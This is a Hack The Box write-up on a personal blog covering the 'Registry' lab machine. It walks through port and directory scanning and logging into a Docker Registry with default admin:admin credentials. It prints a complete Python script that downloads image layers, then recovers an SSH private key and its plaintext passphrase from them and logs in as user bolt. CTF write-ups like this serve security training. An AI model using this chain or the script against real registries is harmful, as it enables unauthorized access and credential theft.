<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Registry - Hack The Box - ezploisite.it</title>
<meta name="description" content="Registry was a hard box with a vulnerable Docker Registry who allow us to retrieve the ssh key for bolt. After some enumerations, we will found into bolt.db the credentials to login through bolt CMS. We can upload a python reverse shell and obtain the connection with www-data. For the privesc we have sudo permission with www-data to run the restic backup which allow us to grub the root ssh key.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="ezploisite.it">
<meta property="og:title" content="Registry - Hack The Box">
<meta property="og:url" content="https://ezploisite.it/htb-writeup-registry/">


  <meta property="og:description" content="Registry was a hard box with a vulnerable Docker Registry who allow us to retrieve the ssh key for bolt. After some enumerations, we will found into bolt.db the credentials to login through bolt CMS. We can upload a python reverse shell and obtain the connection with www-data. For the privesc we have sudo permission with www-data to run the restic backup which allow us to grub the root ssh key.">



  <meta property="og:image" content="https://ezploisite.it/assets/images/htb-writeup-registry/registry.webp">





  <meta property="article:published_time" content="2020-05-01T00:00:00+02:00">





  

  


<link rel="canonical" href="https://ezploisite.it/htb-writeup-registry/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Ezplosiite",
      "url": "https://ezploisite.it",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="ezploisite.it Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/Ezploisite.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Writeups</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Whoami</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="https://ezploisite.it/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Registry - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="Ezploisite" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Ezploisite</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester & CTF player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Italy</span>
        </li>
      

      

      

      
        <li>
          <a href="mailto:bomb@protonmail.com">
            <meta itemprop="email" content="bomb@protonmail.com" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
          </a>
        </li>
      

      
        <li>
          <a href="https://keybase.io/lorenzooo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fas fa-fw fa-key" aria-hidden="true"></i> Keybase
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/ezploisite" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Registry - Hack The Box">
    <meta itemprop="description" content="Registry was a hard box with a vulnerable Docker Registry who allow us to retrieve the ssh key for bolt. After some enumerations, we will found into bolt.db the credentials to login through bolt CMS. We can upload a python reverse shell and obtain the connection with www-data. For the privesc we have sudo permission with www-data to run the restic backup which allow us to grub the root ssh key.">
    <meta itemprop="datePublished" content="May 01, 2020">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Registry - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-05-01T00:00:00+02:00">May 01, 2020 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-registry/registry_logo.jpg" alt="" /></p>

<p>Registry was a hard box with a vulnerable Docker Registry who allow us to retrieve the ssh key for bolt. After some enumerations, we will found into bolt.db the credentials to login thourgh bolt CMS. We can upload a python reverse shell and obtain the connection with www-data. For the privesc we have sudo permission with www-data to run the restic backup which allow us to grub the root ssh key.</p>

<h2 id="summary">Summary</h2>

<ul>
  <li>We can extract from Docker Registry some archivies which allows us to find the ssh_key for the user Bolt.</li>
  <li>After some enumeration we find a databaseâ€™s file called bolt.db where we can extract and crack the password for Bolt CMS.</li>
  <li>Then inside Bolt we have to upload a python reverse shell and get her to Bolt connected in SSH.</li>
  <li>For the privesc with www-data, we can run restic backup as sudo pointing to our listening restic server to get the ssh key for root.</li>
</ul>

<h2 id="portscan-tcp">Portscan TCP</h2>

<p>We discover on the remote host 3 open TCP ports: 22 SSH, 80 HTTP and 442 SSL.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo ~ -&gt; nmap -sV -sC -O 10.10.10.159
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 06:09 CEST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.10.159
Host is up (0.044s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
</code></pre></div></div>

<p>The SSL certificate exposes a hostname <code class="language-plaintext highlighter-rouge">docker.registry.htb</code> that we are going to add to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>

<h2 id="http-recon">HTTP Recon</h2>

<p>Visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.159</code> shows us Nginx default page.</p>

<p><img src="/assets/images/htb-writeup-registry/registry2.jpg" alt="" /></p>

<p>So letâ€™s try to brute force its directories:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo ~ -&gt; python3 /root/Documenti/joker/dirsearch/dirsearch.py -u http://10.10.10.159 -e php,txt,xml -w /usr/share/wordlists/dirbuster/directories.jbrofuzz

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, xml | HTTP method: get | Threads: 10 | Wordlist size: 58649

Error Log: /root/Documenti/joker/dirsearch/logs/errors-20-05-01_06-28-01.log

Target: http://10.10.10.159

[06:28:01] Starting: 
[06:28:01] 200 -  612B  - /
[06:28:01] 200 -  612B  - /% 
[06:28:01] 301 -  194B  - /  -&gt;  http://10.10.10.159/./
[06:28:01] 200 -  612B  - /??                    
[06:28:27] 301 -  194B  - /bolt  -&gt;  http://10.10.10.159/bolt/
[06:29:59] 301 -  194B  - /install  -&gt;  http://10.10.10.159/install/                 
                                                                                     
Task Completed
</code></pre></div></div>

<p>Great! Install and bolt are exposed! Letâ€™s visit <code class="language-plaintext highlighter-rouge">http://10.10.10.159/bolt</code></p>

<p><img src="/assets/images/htb-writeup-registry/registry3.jpg" alt="" /></p>

<p>Bolt is an open-source Content Management Tool. So we can try again to brute force its directories:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo ~ -&gt; python3 /root/Documenti/joker/dirsearch/dirsearch.py -u http://10.10.10.159/bolt/ -e php,txt,xml -w /usr/share/wordlists/dirbuster/directories.jbrofuzz

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, xml | HTTP method: get | Threads: 10 | Wordlist size: 58649

Error Log: /root/Documenti/joker/dirsearch/logs/errors-20-05-01_06-39-58.log

Target: http://10.10.10.159/bolt/                                                                                                                   
                                                                                                                                                    
[06:39:58] Starting: 
[06:39:58] 200 -    8KB - /bolt/
[06:39:59] 301 -  194B  - /bolt/  -&gt;  http://10.10.10.159/bolt/./
[06:39:59] 200 -    8KB - /bolt/??               
[06:40:10] 301 -  194B  - /bolt/app  -&gt;  http://10.10.10.159/bolt/app/
[06:40:24] 302 -  308B  - /bolt/bolt  -&gt;  /bolt/bolt/login
[06:41:15] 301 -  194B  - /bolt/extensions  -&gt;  http://10.10.10.159/bolt/extensions/ 
[06:41:20] 301 -  194B  - /bolt/files  -&gt;  http://10.10.10.159/bolt/files/        
[06:43:43] 301 -  194B  - /bolt/src  -&gt;  http://10.10.10.159/bolt/src/               
[06:43:55] 301 -  194B  - /bolt/tests  -&gt;  http://10.10.10.159/bolt/tests/
[06:43:56] 301 -  194B  - /bolt/theme  -&gt;  http://10.10.10.159/bolt/theme/ 
[06:44:10] 301 -  194B  - /bolt/vendor  -&gt;  http://10.10.10.159/bolt/vendor/
                                                                   
Task Completed
</code></pre></div></div>

<p>And visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.159/bolt/bolt/</code> returns a login page, but we donâ€™t have any credentials, so we gonna moving back on other stuff.</p>

<p><img src="/assets/images/htb-writeup-registry/registry4.jpg" alt="" /></p>

<p>Visiting <code class="language-plaintext highlighter-rouge">http://docker.registry.htb</code> lands us on an empty page. Running dirsearch.py returns an interesting endpoint.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo ~ -&gt; python3 /root/Documenti/joker/dirsearch/dirsearch.py -u http://docker.registry.htb -e php,txt,xml -w /usr/share/wordlists/dirbuster/directories.jbrofuzz

 _|. _ _  _  _  _ _|_    v0.3.9                                                                                                                     
(_||| _) (/_(_|| (_| )                                                                                                                              
                                                                                                                                                    
Extensions: php, txt, xml | HTTP method: get | Threads: 10 | Wordlist size: 58649

Error Log: /root/Documenti/joker/dirsearch/logs/errors-20-05-01_06-53-16.log

Target: http://docker.registry.htb                                                                                                                  
                                                                                                                                                    
[06:53:16] Starting: 
[06:53:17] 200 -    0B  - /
[06:53:17] 301 -    0B  - /  -&gt;  /  
[06:53:17] 301 -    0B  - /%2A%2Ahttp:/www  -&gt;  /%2A%2Ahttp:/www
[06:53:17] 200 -    0B  - /??           
[06:55:06] 301 -    0B  - http://blog  -&gt;  /http:/blog                               
[06:55:06] 301 -    0B  - http://www  -&gt;  /http:/www
[06:55:06] 301 -    0B  - http://youtube  -&gt;  /http:/youtube
[06:55:06] 301 -    0B  - http://blogs  -&gt;  /http:/blogs
[06:57:35] 301 -   39B  - /v2  -&gt;  /v2/                                              
                                                                   
Task Completed 
</code></pre></div></div>

<h2 id="docker-container-recon">Docker Container Recon</h2>

<p>Visiting <code class="language-plaintext highlighter-rouge">docker.registry.htb/v2/</code> we will prompt for a login form, that we can easily pass with credentials <code class="language-plaintext highlighter-rouge">admin:admin</code></p>

<p><img src="/assets/images/htb-writeup-registry/registry5.jpg" alt="" /></p>

<p>Thereâ€™s an interesting header we see in the response <code class="language-plaintext highlighter-rouge">Docker-Distribution-Api-Version registry/2.0</code>. Googling the above header, we can see the Docker Registry API documentation <code class="language-plaintext highlighter-rouge">https://docs.docker.com/registry/spec/api/#listing-repositories</code> which helpfully detailed the anatomy of a docker registry hack. Following their lead, letâ€™s list the repos:</p>

<p><img src="/assets/images/htb-writeup-registry/registry6.jpg" alt="" /></p>

<p><img src="/assets/images/htb-writeup-registry/registry7.jpg" alt="" /></p>

<p><img src="/assets/images/htb-writeup-registry/registry8.jpg" alt="" /></p>

<p>Well. This docker registry is not so secure as it seems. In fact we can use an exploit in python from here <code class="language-plaintext highlighter-rouge">https://github.com/NotSoSecure/docker_fetch/</code> to fetch some more results:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
import json
import optparse
import requests

# pulls Docker Images from unauthenticated docker registry api. 
# and checks for docker misconfigurations. 

apiversion = "v2"
final_list_of_blobs = []

 
# Disable insecure request warning 
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="URL Endpoint for Docker Registry API v2. Eg https://IP:Port", default="spam")
options, args = parser.parse_args()
url = options.url
headers = {"Authorization": "Basic YWRtaW46YWRtaW4=" }


def list_repos():
 req = requests.get(url+ "/" + apiversion + "/_catalog", verify=False,headers=headers)
        print req.text
 return json.loads(req.text)["repositories"]

def find_tags(reponame):
 req = requests.get(url+ "/" + apiversion + "/" + reponame+"/tags/list", verify=False,headers=headers )
 print "\n"
 data =  json.loads(req.content)
 if "tags" in data:
  return data["tags"]


def list_blobs(reponame,tag):
 req = requests.get(url+ "/" + apiversion + "/" + reponame+"/manifests/" + tag, verify=False,headers=headers )
 data = json.loads(req.content)
 if "fsLayers" in data:
  for x in data["fsLayers"]:
   curr_blob = x['blobSum'].split(":")[1]
   if curr_blob not in final_list_of_blobs:
    final_list_of_blobs.append(curr_blob)

def download_blobs(reponame, blobdigest,dirname):
 req = requests.get(url+ "/" + apiversion + "/" + reponame +"/blobs/sha256:" + blobdigest, verify=False,headers=headers)
 filename = "%s.tar.gz" % blobdigest
 with open(dirname + "/" + filename, 'wb') as test:
  test.write(req.content)

def main(): 
 if url is not "spam":
  list_of_repos = list_repos()
  print "\n[+] List of Repositories:\n"
  for x in list_of_repos:
   print x
  target_repo = raw_input("\nWhich repo would you like to download?:  ")
  if target_repo in list_of_repos:
   tags = find_tags(target_repo)
   if tags is not None:
    print "\n[+] Available Tags:\n"
    for x in tags:
     print x

    target_tag = raw_input("\nWhich tag would you like to download?:  ")
    if target_tag in tags:
     list_blobs(target_repo,target_tag)

     dirname = raw_input("\nGive a directory name:  ")
     os.makedirs(dirname)
     print "Now sit back and relax. I will download all the blobs for you in %s directory. \nOpen the directory, unzip all the files and explore like a Boss. " % dirname
     for x in final_list_of_blobs:
      print "\n[+] Downloading Blob: %s" % x
      download_blobs(target_repo,x,dirname)
    else:
     print "No such Tag Available. Qutting...."
   else:
    print "[+] No Tags Available. Quitting...."
  else:
   print "No such repo found. Quitting...."
 else:
  print "\n[-] Please use -u option to define API Endpoint, e.g. https://IP:Port\n"


if __name__ == "__main__":
 main()
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo registry -&gt; python exp.py -u http://docker.registry.htb
{"repositories":["bolt-image"]}


[+] List of Repositories:

bolt-image

Which repo would you like to download?:  bolt-image



[+] Available Tags:

latest

Which tag would you like to download?:  latest

Give a directory name:  catalog
Now sit back and relax. I will download all the blobs for you in catalog directory. 
Open the directory, unzip all the files and explore like a Boss. 

[+] Downloading Blob: 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b

[+] Downloading Blob: 3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee

[+] Downloading Blob: 02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c

[+] Downloading Blob: c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7

[+] Downloading Blob: 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791

[+] Downloading Blob: a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4

[+] Downloading Blob: f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0

[+] Downloading Blob: d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a

[+] Downloading Blob: 8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797

[+] Downloading Blob: f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo registry -&gt; ls
catalog  exp.py
root@lorenzooo registry -&gt; cd catalog
root@lorenzooo catalog -&gt; ls
02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c.tar.gz  a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz
2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791.tar.gz  c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7.tar.gz
302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar.gz  d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a.tar.gz
3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee.tar.gz  f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff.tar.gz
8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797.tar.gz  f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0.tar.gz
</code></pre></div></div>

<h2 id="entry-point-with-bolt">Entry point with Bolt</h2>

<p>I extracted all the archivies in the same folder. So, letâ€™s enumerate the file system:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo catalog -&gt; cd root
root@lorenzooo catalog -&gt; ls
root@lorenzooo root -&gt; find . -type f
./.bashrc
./.viminfo
./.ssh/known_hosts
./.ssh/id_rsa.pub
./.ssh/id_rsa
./.ssh/config
./.bash_history
./.profile
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo root -&gt; cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9

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
Bdtfi9goJBFb6P7yHapZ13W30b96ZQG4Gdf4ZeV6MPMizcTbiggZRBokZLCBMb5H
pgkPgTrGJlbm+sLu/kt4jgex3T/NWwXHVrny5kIuTbbv1fXfyfkPqU66eysstO2s
OxciNk4W41o9YqHHYM9D/uL6xMqO3K/LTYUI+LcCK13pkjP7/zH+bqiClfNt0D2B
Xg6OWYK7E/DTqX+7zqNQp726sDAYKqQNpwgHldyDhOG3i8o66mLj3xODHQzBvwKR
bJ7jrLPW+AmQwo/V8ElNFPyP6oZBEdoNVn/plMDAi0ZzBHJc7hJ0JuHnMggWFXBM
PjxG/w4c8XV/Y2WavafEjT7hHuviSo6phoED5Zb3Iu+BU+qoEaNM/LntDwBXNEVu
Z0pIXd5Q2EloUZDXoeyMCqO/NkcIFkx+//BDddVTFmfw21v2Y8fZ2rivF/8CeXXZ
ot6kFb4G6gcxGpqSZKY7IHSp49I4kFsC7+tx7LU5/wqC9vZfuds/TM7Z+uECPOYI
f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9
RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V
94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr
-----END RSA PRIVATE KEY-----
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo .ssh -&gt; cat config
Host registry
  User bolt
  Port 22
  Hostname registry.htb
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo catalog -&gt; cd etc
root@lorenzooo etc -&gt; cd profile.d
root@lorenzooo profile.d -&gt; ls
01-locale-fix.sh  01-ssh.sh  02-ssh.sh
root@lorenzooo profile.d -&gt; cat 01-ssh.sh
#!/bin/bash
eval `ssh-agent -s`
root@lorenzooo profile.d -&gt; cat 02-ssh.sh
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
</code></pre></div></div>

<p>After a lot of enumeration, we got the id_rsa for bolt, his passphrase and the hostname to connect thourgh ssh.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lorenzooo .ssh -&gt; ssh -i id_rsa bolt@registry.htb
The authenticity of host 'registry.htb (10.10.10.159)' can't be established.
ECDSA key fingerprint is SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'registry.htb,10.10.10.159' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri May  1 04:10:13 UTC 2020

  System load:  0.0               Users logged in:                0
  Usage of /:   5.7% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 26%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    154
Last login: Mon Oct 21 10:31:48 2019 from 10.10.14.2
bolt@bolt:~$ pwd
/home/bolt
bolt@bolt:~$ ls
user.txt
bolt@bolt:~$ cat user.txt
ytc0ytdmnzywnzgxngi0zte0otm3ywzi 
</code></pre></div></div>

<h2 id="lateral-with-www-data">Lateral with www-data</h2>

<p>Again, after some deep enumeration on the file system, we found on <code class="language-plaintext highlighter-rouge">/var/www/html</code> an interesting <code class="language-plaintext highlighter-rouge">backup.php</code> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bolt@bolt:/var/www/html$ cat backup.php
&lt;?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
</code></pre></div></div>

<p>We can assume that the user www-data has sudo permission on restic binary, since bolt cms is running as www-data user.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bolt@bolt:/var/www/html$ cd bolt
bolt@bolt:/var/www/html/bolt$ cd app
bolt@bolt:/var/www/html/bolt/app$ cd database
bolt@bolt:/var/www/html/bolt/app/database$ ls -lah
total 300K
drwxrwxr-x 2 www-data www-data 4.0K Oct 21  2019 .
drwxrwxr-x 9 www-data www-data 4.0K Oct 21  2019 ..
-rw-r--r-- 1 www-data www-data 288K May  1 02:52 bolt.db
-rw-rw-r-- 1 www-data www-data  170 Oct  8  2019 .gitignore
</code></pre></div></div>
